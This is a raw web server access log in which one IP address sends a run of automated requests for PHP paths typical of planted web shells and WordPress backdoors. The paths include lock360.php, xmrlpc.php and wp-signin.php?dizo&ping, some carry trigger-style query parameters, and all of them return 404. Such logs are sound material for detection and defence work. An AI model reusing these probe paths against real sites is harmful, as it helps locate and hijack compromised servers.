45.227.254.38 - - [23/Mar/2023:08:31:09 +0000] "GET /wikindex.php?f=/NmRtJOUjAdutReQj/scRjKUhleBpzmTyO.txt HTTP/1.1" 404 0 "www.bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
45.227.254.38 - - [23/Mar/2023:08:33:13 +0000] "GET /wp-content/mu-plugins-old/index.php?f=/NmRtJOUjAdutReQj/scRjKUhleBpzmTyO.txt HTTP/1.1" 404 0 "www.bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
45.227.254.38 - - [23/Mar/2023:08:33:14 +0000] "GET /radio.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:35:20 +0000] "GET /lock360.php?daksldlkdsadas=1 HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
66.249.64.195 - - [23/Mar/2023:08:36:39 +0000] "GET / HTTP/1.1" 200 605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.227.254.38 - - [23/Mar/2023:08:37:30 +0000] "GET /wp-load.php?daksldlkdsadas=1 HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:39:43 +0000] "GET /old-index.php?daksldlkdsadas=1 HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:39:44 +0000] "GET /xmrlpc.php?daksldlkdsadas=1 HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:39:45 +0000] "GET /xmlrpcs.php?daksldlkdsadas=1 HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:41:51 +0000] "GET /wp-admin.php?daksldlkdsadas=1 HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:43:59 +0000] "GET /qindex.php?daksldlkdsadas=1 HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:46:04 +0000] "GET /doc.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:48:05 +0000] "GET /wp_wrong_datlib.php HTTP/1.1" 404 0 "www.bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
45.227.254.38 - - [23/Mar/2023:08:48:06 +0000] "GET /beence.php HTTP/1.1" 404 0 "www.bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
45.227.254.38 - - [23/Mar/2023:08:50:08 +0000] "GET /ups.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:50:09 +0000] "GET /wp-signin.php?dizo&ping HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:50:14 +0000] "GET /media-admin.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:50:19 +0000] "GET /export.php HTTP/1.1" 404 0 "www.bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
45.227.254.38 - - [23/Mar/2023:08:50:23 +0000] "GET /wp-content/export.php HTTP/1.1" 404 0 "www.bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
45.227.254.38 - - [23/Mar/2023:08:50:24 +0000] "GET /wp-includes/wp-class.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:50:25 +0000] "GET /wp-includes/wp-atom.php HTTP/1.1" 404 0 "www.bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
45.227.254.38 - - [23/Mar/2023:08:50:26 +0000] "GET /wp-includes/images/css.php HTTP/1.1" 404 0 "www.bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
45.227.254.38 - - [23/Mar/2023:08:50:27 +0000] "GET /wp-includes/css/css.php HTTP/1.1" 404 0 "www.bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
45.227.254.38 - - [23/Mar/2023:08:50:28 +0000] "GET /defau1t.php HTTP/1.1" 404 0 "www.bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
45.227.254.38 - - [23/Mar/2023:08:50:29 +0000] "GET /css.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:50:30 +0000] "GET /moduless.php HTTP/1.1" 404 0 "www.bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
